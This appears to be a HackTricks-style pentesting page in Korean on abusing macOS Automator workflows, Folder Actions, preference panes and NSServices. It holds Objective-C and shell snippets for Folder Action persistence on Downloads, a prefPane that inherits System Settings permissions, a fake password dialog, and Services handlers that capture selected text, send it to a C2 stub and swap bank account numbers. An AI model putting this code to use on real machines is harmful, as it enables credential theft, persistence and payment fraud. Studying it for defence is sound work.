# macOS Automator, Preference Panes & NSServices 오용

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### 기본 정보

**Automator**는 macOS의 시각적 자동화 도구입니다. 이는 **workflows** (`.workflow` bundles)가 **actions** (`.action` bundles)로 구성된 번들을 실행합니다. Automator는 또한 **Folder Actions**, **Quick Actions**, 그리고 **Shortcuts** 통합을 제공합니다.

Automator actions는 워크플로우 실행 시 Automator 런타임에 로드되는 **plugins**입니다. 이들은:
- 임의의 shell 스크립트 실행
- 파일 및 데이터 처리
- AppleScript를 통한 애플리케이션 상호작용
- 복잡한 자동화를 위해 서로 연결 가능

### 왜 이것이 중요한가

> [!WARNING]
> Automator workflows는 문서 파일처럼 보이기 때문에 실행을 위해 **social-engineered** 될 수 있습니다. `.workflow` 번들은 워크플로우가 실행될 때 실행되는 임베디드 shell 명령을 포함할 수 있습니다. Folder Actions와 결합하면 파일 이벤트에 반응하는 **automatic persistence**를 제공합니다.

### 발견
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

대부분의 사용자에게 `.workflow` 번들은 일반 문서 파일처럼 보입니다:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions는 모니터링된 폴더에 파일이 추가될 때 자동으로 workflow를 실행합니다:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions는 재부팅 후에도 유지되며 조용히 실행됩니다. `~/Downloads`에 설정된 Folder Action은 **모든 다운로드된 파일이 여러분의 payload를 트리거합니다** — 여기에는 Safari, Chrome, AirDrop 및 이메일 첨부파일이 포함됩니다.

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles)은 **System Settings**(이전의 System Preferences)에 로드되는 플러그인입니다. 이들은 시스템 또는 서드파티 기능을 위한 구성 UI 패널을 제공합니다.

### Why This Matters

- Preference panes는 **System Settings 프로세스** 내에서 실행되며, 이 프로세스는 **elevated TCC permissions**(일부 상황에서 accessibility, full disk access)을 가질 수 있습니다
- 서드파티 preference panes는 이 신뢰된 프로세스에 로드되어 **그 보안 컨텍스트를 상속**합니다
- 사용자는 preference panes를 **double-clicking**으로 설치합니다 — 쉬운 social engineering
- 일단 설치되면, 그것들은 지속적으로 남아 System Settings가 해당 패널을 열 때마다 로드됩니다

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

악성 환경설정 패널은 System Settings의 보안 컨텍스트를 상속합니다:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### 공격: 설치를 통한 지속성
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### 공격: UI Phishing

환경설정 패널은 합법적인 시스템 UI 패널을 모방하여 **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### 기본 정보

**NSServices**는 애플리케이션이 **Services 메뉴**(오른쪽 클릭 → Services)를 통해 다른 앱에 기능을 제공할 수 있게 한다. 사용자가 텍스트나 데이터를 선택하고 서비스를 호출하면, 선택된 데이터는 처리 위해 **서비스 제공자에게 전송된다**.

서비스는 애플리케이션의 `Info.plist`에 있는 `NSServices` 키 아래에 선언되고 pasteboard 서버(`pbs`)에 등록된다.

### 이것이 중요한 이유

- 서비스는 **애플리케이션 간 데이터 흐름**을 받는다 — 모든 애플리케이션에서 선택된 텍스트가 서비스로 전송된다
- 악성 서비스는 비밀번호 관리자, 이메일 클라이언트, 금융 앱에서 데이터를 캡처할 수 있다
- 서비스는 호출한 애플리케이션에 **수정된 데이터를 반환할 수 있다** (man-in-the-middle on selection operations)
- 서비스 이름은 합법적으로 보이도록 조작될 수 있다 ("Format Text", "Encrypt Selection", "Share")

### 발견
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### 공격: 데이터 가로채기 서비스
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### 공격: Data Modification (Man-in-the-Middle)

서비스는 정상적인 기능을 제공하는 것처럼 보이면서 **반환된 데이터를 수정할 수 있다:**
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## 교차 기법 공격 체인

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 환경설정 패널 → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → 비밀번호 관리자 탈취
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 참고자료

* [Apple Developer — Automator 프로그래밍 가이드](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane 프로그래밍 가이드](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services 구현 가이드](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
